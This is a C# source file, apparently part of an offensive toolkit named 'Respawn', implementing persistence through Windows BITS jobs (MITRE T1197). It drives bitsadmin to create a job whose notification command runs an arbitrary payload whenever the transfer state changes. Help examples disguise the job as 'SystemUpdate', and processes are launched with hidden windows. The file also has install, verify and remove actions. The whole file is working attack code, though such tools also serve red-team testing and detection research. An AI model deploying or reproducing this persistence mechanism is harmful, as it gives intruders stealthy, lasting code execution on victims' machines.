using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System.Diagnostics;
using System.Security.Principal;

namespace Respawn.Techniques.Bits
{
    public class BitsModule : ITechniqueModule
    {
        public string Id          => "bits";
        public string Name        => "BITS Jobs";
        public string Mitre       => "T1197";
        public string Description => "Persist by abusing the Background Intelligent Transfer Service (BITS) to schedule a malicious job that automatically executes a custom notification payload whenever the job's transfer state changes.";

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "BITS job name");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Command to execute (exe, script, or built-in tool)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t bits -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t bits -a install -n \"SystemUpdate\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t bits -a verify  -n \"SystemUpdate\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t bits -a remove  -n \"SystemUpdate\"");
        }

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return BitsKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                // check if job already exists
                string? existingId = GetJobId(ctx.Name);
                if (existingId != null)
                    return TechniqueResult.Exists($"BITS job '{ctx.Name}' already exists (ID: {existingId}).");

                string tempFile = Path.Combine(Path.GetTempPath(), $"respawn_{ctx.Name}.tmp");

                // create job
                Run("bitsadmin", $"/create {ctx.Name}");

                // add dummy file to keep job alive
                Run("bitsadmin", $"/addfile {ctx.Name} http://localhost/respawn_placeholder \"{tempFile}\"");

                // set notification command — fires on error and completion
                Run("bitsadmin", $"/setnotifycmdline {ctx.Name} \"{ctx.Payload}\" NULL");

                // set notify flags = 3 (error + completion)
                Run("bitsadmin", $"/setnotifyflags {ctx.Name} 3");

                // resume job so it attempts transfer and fails → triggers notification
                Run("bitsadmin", $"/resume {ctx.Name}");

                return TechniqueResult.Ok(
                    $"Installed BITS job '{ctx.Name}' | Payload: '{ctx.Payload}'");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                string? existingId = GetJobId(ctx.Name);
                if (existingId == null)
                    return TechniqueResult.NotFound($"BITS job '{ctx.Name}' not found.");

                Run("bitsadmin", $"/cancel {ctx.Name}");
                return TechniqueResult.Ok($"Removed BITS job '{ctx.Name}'.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                string? existingId = GetJobId(ctx.Name);
                if (existingId == null)
                    return TechniqueResult.NotFound($"BITS job '{ctx.Name}' not found.");

                string info = RunCapture("bitsadmin", $"/info {ctx.Name} /verbose");

                // extract notification command from info
                string payload = "unknown";
                foreach (var line in info.Split('\n'))
                {
                    if (line.Contains("Notification Command Line", StringComparison.OrdinalIgnoreCase))
                    {
                        payload = line.Split(':').Last().Trim();
                        break;
                    }
                }

                return TechniqueResult.Ok(
                    $"Verified BITS job '{ctx.Name}' | " +
                    $"ID: {existingId} | " +
                    $"Payload: '{payload}'");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private string? GetJobId(string name)
        {
            string args;

            if (IsAdmin())
            {
                args = "/list /allusers";
            }
            else
            {
                args = "/list";
            }

            string output = RunCapture("bitsadmin", args);
            foreach (var line in output.Split('\n'))
            {
                if (line.Contains(name, StringComparison.OrdinalIgnoreCase))
                {
                    // extract job ID from line like: {GUID} name state ...
                    var parts = line.Trim().Split(' ');
                    if (parts.Length > 0 && parts[0].StartsWith("{"))
                        return parts[0];
                }
            }
            return null;
        }

        private void Run(string exe, string args)
        {
            var psi = new ProcessStartInfo(exe, args)
            {
                UseShellExecute        = false,
                CreateNoWindow         = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true
            };
            using var p = Process.Start(psi);
            p?.WaitForExit();
        }

        private string RunCapture(string exe, string args)
        {
            var psi = new ProcessStartInfo(exe, args)
            {
                UseShellExecute        = false,
                CreateNoWindow         = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true
            };
            using var p = Process.Start(psi);
            string output = p?.StandardOutput.ReadToEnd() ?? string.Empty;
            p?.WaitForExit();
            return output;
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No job name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <payload>.";
                return false;
            }
            error = string.Empty;
            return true;
        }

        bool IsAdmin()
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}